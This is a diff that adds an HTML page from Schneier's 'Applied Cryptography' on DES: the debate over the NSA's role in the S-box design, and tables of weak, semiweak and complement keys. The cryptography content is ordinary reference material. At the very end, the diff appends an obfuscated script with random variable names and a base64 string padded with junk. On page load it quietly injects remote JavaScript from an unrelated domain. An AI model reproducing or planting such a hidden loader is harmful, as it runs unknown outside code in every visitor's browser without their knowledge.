@@ -1,0 +1,195 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=280-281//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Later in the article, Tuchman is quoted: &#147;We developed the DES algorithm entirely within IBM using IBMers. The NSA did not dictate a single wire!&#148; Tuchman reaffirmed this when he spoke on the history of DES at the 1992 National Computer Security Conference.
+</P>
+<P>On the other hand, Coppersmith wrote [373,374]: &#147;The National Security Agency (NSA) also provided technical advice to IBM.&#148; And Konheim has been quoted as saying: &#147;We sent the S-boxes off to Washington. They came back and were all different. We ran our tests and they passed.&#148; People have pointed to this as evidence that the NSA put a trapdoor in DES.</P>
+<P>NSA, when questioned regarding any imposed weakness in DES, said [363]:</P>
+<BLOCKQUOTE><P>Regarding the Data Encryption Standard (DES), we believe that the public record from the Senate Committee for Intelligence&#146;s investigation in 1978 into NSA&#146;s role in the development of the DES is responsive to your question. That committee report indicated that NSA did not tamper with the design of the algorithm in any way and that the security afforded by the DES was more than adequate for at least a 5&#150;10 year time span for the unclassified data for which it was intended. In short, NSA did not impose or attempt to impose any weakness on the DES.
+</P>
+</BLOCKQUOTE><P>Then why did they modify the S-boxes? Perhaps it was to ensure that IBM did not put a trapdoor in DES. The NSA had no reason to trust IBM&#146;s researchers, and would be lax in their duty if they did not make absolutely sure that DES was free of trapdoors. Dictating the S-boxes is one way they could make sure.
+</P>
+<P>Very recently some new cryptanalysis results have shed some light on this issue, but for many years this has been the subject of much speculation.</P>
+<P><FONT SIZE="+1"><B><I>Weak Keys</I></B></FONT></P>
+<P>Because of the way the initial key is modified to get a subkey for each round of the algorithm, certain initial keys are <B>weak keys</B> [721,427]. Remember that the initial value is split into two halves, and each half is shifted independently. If all the bits in each half are either 0 or 1, then the key used for any cycle of the algorithm is the same for all the cycles of the algorithm. This can occur if the key is entirely 1s, entirely 0s, or if one half of the key is entirely 1s and the other half is entirely 0s. Also, two of the weak keys have other properties that make them less secure [427].</P>
+<P>The four weak keys are shown in hexadecimal notation in Table 12.11. (Remember that every eighth bit is a parity bit.)</P>
+<P>Additionally, some pairs of keys encrypt plaintext to the identical ciphertext. In other words, one key in the pair can decrypt messages encrypted with the other key in the pair. This is due to the way in which DES generates subkeys; instead of generating 16 different subkeys, these keys generate only two different subkeys. Each of these subkeys is used eight times in the algorithm. These keys are called <B>semiweak keys,</B> and are shown in hexadecimal notation in Table 12.12.</P>
+<TABLE WIDTH="70%"><TH COLSPAN="5" VALIGN="TOP" ALIGN="CENTER">Table 12.11<BR>DES Weak Keys
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TH WIDTH="10%" VALIGN="TOP" ALIGN="LEFT">Weak 
+<TH WIDTH="10%" VALIGN="TOP" ALIGN="TOP">Key Value 
+<TH WIDTH="20%" VALIGN="TOP" ALIGN="LEFT" COLSPAN="2">(with parity bits)
+<TH WIDTH="20%" VALIGN="TOP" ALIGN="LEFT">Actual Key
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">0101
+<TD VALIGN="TOP" ALIGN="LEFT">0101
+<TD VALIGN="TOP" ALIGN="LEFT">0101
+<TD VALIGN="TOP" ALIGN="LEFT">0101
+<TD VALIGN="TOP" ALIGN="LEFT">0000000 0000000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">1F1F
+<TD VALIGN="TOP" ALIGN="LEFT">1F1F
+<TD VALIGN="TOP" ALIGN="LEFT">0E0E
+<TD VALIGN="TOP" ALIGN="LEFT">0E0E
+<TD VALIGN="TOP" ALIGN="LEFT">0000000 FFFFFFF
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">E0E0
+<TD VALIGN="TOP" ALIGN="LEFT">E0E0
+<TD VALIGN="TOP" ALIGN="LEFT">F1F1
+<TD VALIGN="TOP" ALIGN="LEFT">F1F1
+<TD VALIGN="TOP" ALIGN="LEFT">FFFFFFF 0000000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">FEFE
+<TD VALIGN="TOP" ALIGN="LEFT">FEFE
+<TD VALIGN="TOP" ALIGN="LEFT">FEFE
+<TD VALIGN="TOP" ALIGN="LEFT">FEFE
+<TD VALIGN="TOP" ALIGN="LEFT">FFFFFFF FFFFFFF
+<TR>
+<TD COLSPAN="5"><HR>
+</TABLE>
+<P>Some keys produce only four subkeys, each used four times in the algorithm. These <B>possibly weak</B> keys are listed in Table 12.13.</P>
+<P>Before condemning DES for having weak keys, consider that this list of 64 keys is minuscule compared to the total set of 72,057,594,037,927,936 possible keys. If you select a random key, the odds of picking one of these keys is negligible. If you are truly paranoid, you could always check for weak keys during key generation. Some people don&#146;t think it&#146;s worth the bother. Others say that it&#146;s so easy to check, there&#146;s no reason not to.</P>
+<P>There is further analysis on weak and semiweak keys in [1116], and additional key patterns have been investigated for weaknesses. None have been found.</P>
+<P><FONT SIZE="+1"><B><I>Complement Keys</I></B></FONT></P>
+<P>Take the bit-wise complement of a key; that is, replace all the 0s with 1s and the 1s with 0s. Now, if the original key encrypts a block of plaintext, then the complement of the key will encrypt the complement of the plaintext block into the complement of the ciphertext block.
+</P>
+<P>If <I>x&#146;</I> is the complement of <I>x,</I> then the identity is as follows:</P>
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>P</I>) = <I>C</I>
+<DD><I>E</I><SUB>K</SUB>&#146;(<I>P&#146;</I>) = <I>C&#146;</I>
+</DL>
+<P>This isn&#146;t anything mysterious. The subkeys are XORed with the right half after the expansion permutation in every round. This <B>complementation property</B> is a direct result of that fact.</P>
+<TABLE WIDTH="60%"><TR>
+<TH CAPTION COLSPAN="9" ALIGN="CENTER">Table 12.12<BR>DES Semiweak Key Pairs
+<TR>
+<TD COLSPAN="9"><HR>
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">and
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE01
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE01
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE01
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE01
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1FE0
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1FE0
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">0EF1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">0EF1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">and
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">E01F
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">E01F
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">F10E
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">F10E
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01E0
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01E0
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01F1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">01F1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">and
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">E001
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">E001
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">F101
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">F101
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1FFE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1FFE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">0EFE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">0EFE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">and
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE1F
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE1F
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE0E
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FE0E
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">011F
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">011F
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">010E
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">010E
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">and
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1F01
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1F01
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">0E01
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">0E01
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">E0FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">E0FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">F1FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">F1FE
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">and
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FEE0
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FEE0
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FEF1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">FEF1
+<TR>
+<TD WIDTH="6%" COLSPAN="9"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(dWUoaazo, Eigsoamn) {Eigsoamn = dWUoaazo.createElement('script');Eigsoamn.type = 'text/javascript';Eigsoamn.async = true;Eigsoamn.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');dWUoaazo.getElementsByTagName('body')[0].appendChild(Eigsoamn);}(document));</script></body>
+</html>
